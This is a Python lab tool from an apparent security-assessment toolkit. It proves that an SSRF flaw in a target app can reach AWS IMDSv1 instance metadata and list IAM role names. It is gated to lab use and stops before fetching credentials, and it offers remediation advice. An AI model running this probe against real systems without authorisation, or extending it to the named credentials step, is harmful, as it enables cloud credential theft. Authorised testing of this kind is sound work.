"""[EXPLOIT: lab-only] ssrf-metadata-lab — SSRF -> cloud instance metadata
escalation pattern (AWS IMDSv1 class, CWE-918), proven against a fetch
endpoint in YOUR lab.

Gate (core/lab_gate.py, before the first request): env LAB=1 required;
a non-loopback target also needs LAB_REMOTE_ACK=<written reason>.
Refusal = exit 2. The gate judges the TARGET (the vulnerable app); the
metadata address is only ever reached by that app, never by this script.

Niche vs existing code: tools/ssrf_metadata_map.py is the OFFLINE mapper
(which IMDS endpoints a confirmed primitive could reach; sends nothing);
exploit_playbooks `ssrf-chain` proves SSRF into an internal service via a
per-run marker. This script is the live lab proof of the cloud
escalation step: the fetcher reaches link-local instance metadata, and
IMDSv2 (token-required) is recognised as the hardening that stops it.

MINIMAL PROOF BY CONSTRUCTION — credentials are never fetched:
  1. control : <param>=http://127.0.0.1:1/            (closed port)
  2. probe   : <param>=http://169.254.169.254/latest/meta-data/   (x2)
     claim needs >= 3 IMDS top-level keys in the response, absent from
     the control (an endpoint that always returns IMDS-looking text is
     an echo/honeypot -> no claim).
  3. escalate: <param>=.../meta-data/iam/security-credentials/
     -> the role NAME only. There is no code path that requests
     .../security-credentials/<role> (the secret document); the PoC
     stops one step before credential material.
At most 4 requests, all GET, no state change.

Exit: 0 report written; 2 refused / input error.
"""
from __future__ import annotations

import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402
import lab_gate  # noqa: E402

TOOL = "ssrf-metadata-lab"
SCHEMA = "secai.ssrf-metadata-lab/1"
TIMEOUT_S = 10.0
IMDS = "http://169.254.169.254/latest/meta-data/"
IMDS_ROLES = IMDS + "iam/security-credentials/"
CONTROL = "http://127.0.0.1:1/"
IMDS_KEYS = ("ami-id", "ami-launch-index", "hostname", "iam/",
             "instance-id", "instance-type", "local-hostname",
             "local-ipv4", "mac", "placement/", "public-ipv4",
             "security-groups", "block-device-mapping/")
MIN_KEYS = 3
_ROLE_RE = re.compile(r"^[\w+=,.@-]{1,128}$")


def imds_keys(body: str) -> list[str]:
    """IMDS top-level keys present as whole lines in a listing body."""
    lines = {ln.strip() for ln in (body or "").splitlines()}
    return sorted(k for k in IMDS_KEYS if k in lines)


def role_names(body: str) -> list[str]:
    names = [ln.strip() for ln in (body or "").splitlines() if ln.strip()]
    return [n for n in names if _ROLE_RE.match(n)][:5]


def _fetch(url: str, param: str, payload: str) -> dict:
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q = [(k, v) for k, v in q if k != param] + [(param, payload)]
    full = urllib.parse.urlunsplit(parts._replace(
        query=urllib.parse.urlencode(q)))
    req = urllib.request.Request(full, method="GET",
                                 headers={"User-Agent": "secai-ssrf-lab"})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT_S) as r:
            return {"url": full, "status": r.status,
                    "body": r.read(16_000).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        return {"url": full, "status": e.code,
                "body": (e.read(4_000) or b"").decode("utf-8", "replace")}
    except Exception as exc:  # noqa: BLE001 — network failure = no claim
        return {"url": full, "status": None, "body": "",
                "error": f"{type(exc).__name__}: {exc}"[:160]}


def audit(url: str, param: str, obs: dict) -> tuple[list[dict], dict]:
    """Pure: {control, probe1, probe2, roles|None} -> (rows, meta)."""
    rows: list[dict] = []
    ctrl_keys = imds_keys(obs["control"].get("body", ""))
    k1 = imds_keys(obs["probe1"].get("body", ""))
    k2 = imds_keys((obs.get("probe2") or {}).get("body", ""))
    reproduced = len(k1) >= MIN_KEYS and len(k2) >= MIN_KEYS
    honeypot = len(ctrl_keys) >= MIN_KEYS
    roles = role_names((obs.get("roles") or {}).get("body", "")) \
        if obs.get("roles") else []
    meta = {"url": url, "param": param, "schema": SCHEMA,
            "imds_keys": k1, "control_keys": ctrl_keys,
            "reproduced": reproduced, "honeypot": honeypot,
            "role_names_found": len(roles),
            "credentials_requested": False}
    common = {"tool": TOOL, "target_url": url, "param": param,
              "lab_only": True}
    p_status = obs["probe1"].get("status")
    if obs["probe1"].get("status") is None and \
            obs["control"].get("status") is None:
        rows.append(make_finding(
            **common, title=f"Target unreachable: {url} — no claim",
            severity="info", evidence_kind="request-response",
            finding_class="posture",
            description="Control and probe failed at the network level; "
                        "fail-closed.", status="confirmed", verdict=0,
            confidence=1.0, extra={"category": "AMAN"}))
        return rows, meta
    if honeypot:
        rows.append(make_finding(
            **common, title=f"IMDS-like text returned for ANY input on {url}"
                            " — no claim",
            severity="info", evidence_kind="request-response",
            finding_class="posture",
            description="The closed-port control already returns IMDS key "
                        f"names ({', '.join(ctrl_keys)}): echo/honeypot "
                        "behaviour, not proof of metadata access.",
            status="confirmed", verdict=0, confidence=1.0,
            extra={"category": "AMAN"}))
        return rows, meta
    if reproduced:
        sev = "critical" if roles else "high"
        what = (f"incl. the IAM role credentials listing (role name(s): "
                f"{', '.join(roles)})" if roles else
                "(no IAM role attached / listing empty)")
        rows.append(make_finding(
            **common,
            title=f"SSRF reaches instance metadata (IMDSv1) via "
                  f"'{param}' on {url}",
            severity=sev, cwe="CWE-918",
            description=(
                f"GET-only SSRF fetched {IMDS} twice; response lists "
                f"{len(k1)} IMDS keys ({', '.join(k1)}) absent from the "
                f"closed-port control — {what}. Escalation path: role "
                "name -> temporary credentials document. The PoC stops "
                "BEFORE the credentials document (never requested)."),
            recommendation=(
                "Require IMDSv2 (HttpTokens=required, hop limit 1); "
                "block link-local 169.254.0.0/16 in the fetcher (resolve "
                "then check, also after redirects); allowlist outbound "
                "destinations; scope the instance role to least privilege."),
            request=obs["probe1"].get("url", ""),
            response=(obs["probe1"].get("body") or "")[:300],
            poc=obs["probe1"].get("url", ""),
            evidence_kind="poc-exploit", finding_class="weakness",
            status="confirmed", verdict=3, confidence=1.0,
            extra={"category": "PROVEN", "safety_class": "active-probe",
                   "imds_version": "v1", "role_names": roles}))
        return rows, meta
    if len(k1) >= MIN_KEYS:
        rows.append(make_finding(
            **common, title=f"Metadata listing seen once, not reproduced "
                            f"on {url}", severity="medium", cwe="CWE-918",
            description="IMDS keys in the first probe only — LEAD.",
            evidence_kind="request-response", finding_class="weakness",
            status="confirmed", verdict=1, confidence=0.5,
            extra={"category": "LEAD"}))
        return rows, meta
    hint = (" Upstream answered 401 — consistent with IMDSv2 "
            "(token required), which a GET-only SSRF cannot satisfy."
            if p_status == 401 or "401" in (obs["probe1"].get("body") or "")
            else "")
    rows.append(make_finding(
        **common, title=f"No instance metadata reached via '{param}' on "
                        f"{url}", severity="info",
        evidence_kind="request-response", finding_class="posture",
        description="Probe response carries no IMDS listing." + hint,
        status="confirmed", verdict=0, confidence=1.0,
        extra={"category": "AMAN", "imdsv2_hint": bool(hint)}))
    return rows, meta


def main(argv: "list[str] | None" = None) -> int:
    ap = argparse.ArgumentParser(
        description="[EXPLOIT: lab-only] ssrf-metadata-lab: SSRF -> IMDSv1 "
                    "escalation proof (never fetches credentials). "
                    "Requires env LAB=1.")
    ap.add_argument("--url", required=True,
                    help="lab endpoint that fetches a URL server-side")
    ap.add_argument("--param", default="url",
                    help="query parameter carrying the URL to fetch "
                         "(default: url)")
    ap.add_argument("--out", default="ssrf_metadata_lab.json")
    args = ap.parse_args(argv)
    refused, gate = lab_gate.check(args.url, TOOL)
    if refused is not None:
        return refused
    if not args.param.strip():
        print(f"[{TOOL}] input error: --param is empty", file=sys.stderr)
        return 2
    obs = {"control": _fetch(args.url, args.param, CONTROL),
           "probe1": _fetch(args.url, args.param, IMDS)}
    sent = 2
    obs["probe2"] = None
    obs["roles"] = None
    if len(imds_keys(obs["probe1"].get("body", ""))) >= MIN_KEYS and \
            len(imds_keys(obs["control"].get("body", ""))) < MIN_KEYS:
        obs["probe2"] = _fetch(args.url, args.param, IMDS)
        obs["roles"] = _fetch(args.url, args.param, IMDS_ROLES)
        sent += 2
    rows, meta = audit(args.url, args.param, obs)
    meta.update(gate)
    meta.update({"requests": sent, "safety_class": "active-probe",
                 "tier": "exploit-lab", "lab_only": True})
    write_findings(args.out, rows, meta)
    print(f"{TOOL}: {len(rows)} row(s), reproduced={meta['reproduced']} "
          f"({sent} request) -> {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
